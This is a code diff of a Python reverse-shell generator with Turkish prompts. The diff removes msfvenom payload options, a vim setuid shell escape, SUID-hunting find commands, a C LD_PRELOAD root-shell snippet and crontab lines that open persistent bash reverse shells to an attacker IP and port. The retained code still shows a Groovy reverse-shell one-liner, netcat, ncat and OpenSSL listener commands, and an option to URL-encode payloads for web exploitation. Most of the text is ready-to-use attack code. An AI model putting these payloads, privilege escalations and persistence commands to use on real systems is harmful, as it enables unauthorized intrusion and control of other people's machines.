@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import sys
 import os
 import base64
@@ -31,16 +34,10 @@ def get_input():
     print("15. OpenSSL")
     print("16. Dart")
     print("17. Groovy")
-    print("18. MSFVenom")
-    print("19. VIM")
-    print("20. Find SUID")
-    print("21. SSH")
-    print("22. C Code SUID")
-    print("23. Cron Job")
     
     try:
-        choice = int(input("\nShell türü seç (1-23): "))
-        if choice < 1 or choice > 23:
+        choice = int(input("\nShell türü seç (1-17): "))
+        if choice < 1 or choice > 17:
             print("Geçersiz seçim!")
             sys.exit(1)
     except ValueError:
@@ -97,14 +94,6 @@ def get_input():
         print("2. IO::Socket module")
         print("3. Windows compatible")
         payload_options['perl'] = input("Seçim (1-3, varsayılan 1): ") or "1"
-    
-    elif choice == 18:
-        print("\nMSFVenom payload seçenekleri:")
-        print("1. Windows x64 Reverse TCP")
-        print("2. Linux x64 Reverse TCP")
-        print("3. Android Reverse TCP")
-        print("4. PHP Reverse TCP")
-        payload_options['msf'] = input("Seçim (1-4, varsayılan 1): ") or "1"
     
     return choice, ip, port, payload_options
 
@@ -208,37 +197,6 @@ def generate_shell(choice, ip, port, options):
         
         17: [
             f"""groovy -e 'String host="{ip}";int port={port};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();'"""
-        ],
-        
-        18: [
-            f"msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST={ip} LPORT={port}",
-            f"msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST={ip} LPORT={port}",
-            f"msfvenom -p android/meterpreter/reverse_tcp -o shell.apk LHOST={ip} LPORT={port}",
-            f"msfvenom -p php/meterpreter/reverse_tcp -o shell.php LHOST={ip} LPORT={port}"
-        ],
-        
-        19: [
-            f"vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
-        ],
-        
-        20: [
-            f"find / -perm -u=s -type f 2>/dev/null",
-            f"find / -writable 2>/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u",
-            f"find . -exec /bin/sh -p \\; -quit"
-        ],
-        
-        21: [
-            f"ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa user@{ip}",
-            f"ssh -i private_key user@{ip}"
-        ],
-        
-        22: [
-            f"#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {{\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}}\n\n# Derleme: gcc -fPIC -shared -o shell.so shell.c -nostartfiles"
-        ],
-        
-        23: [
-            f"echo \"* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\" >> /etc/crontab",
-            f"crontab -l | {{ cat; echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"; }} | crontab -"
         ]
     }
     
@@ -253,7 +211,7 @@ def print_listener_command(port, ip, shell_type):
     print(f"\nDinleyici komutu (kendi makinende çalıştır):")
     
     if shell_type == 15:
-        print(f"openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem")
+        print(f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes")
         print(f"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}")
         print(f"veya")
         print(f"ncat --ssl -vv -l -p {port}")
@@ -262,9 +220,6 @@ def print_listener_command(port, ip, shell_type):
         print(f"nc -nvlp {port}")
         print(f"UDP shell'ler için:")
         print(f"nc -u -lvp {port}")
-    
-    elif shell_type == 18:
-        print(f"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST {ip}; set LPORT {port}; run\"")
     
     else:
         print(f"nc -nvlp {port}")
@@ -281,7 +236,7 @@ def main():
     
     shell_code = generate_shell(choice, ip, port, options)
     
-    print(f"\nOluşturulan komut:\n")
+    print(f"\nOluşturulan reverse shell kodu:\n")
     print(f"{shell_code}\n")
     
     if input("Web sömürüsü için URL encode yapılsın mı? (y/N): ").lower() == 'y':
@@ -301,7 +256,7 @@ def main():
         filename = input("Dosya adı (varsayılan: shell.txt): ") or "shell.txt"
         with open(filename, 'w') as f:
             f.write(shell_code)
-        print(f"Komut {filename} dosyasına kaydedildi")
+        print(f"Shell {filename} dosyasına kaydedildi")
         
         if input("Çalıştırılabilir script oluşturulsun mu? (y/N): ").lower() == 'y':
             script_name = f"shell_{ip}_{port}.sh"
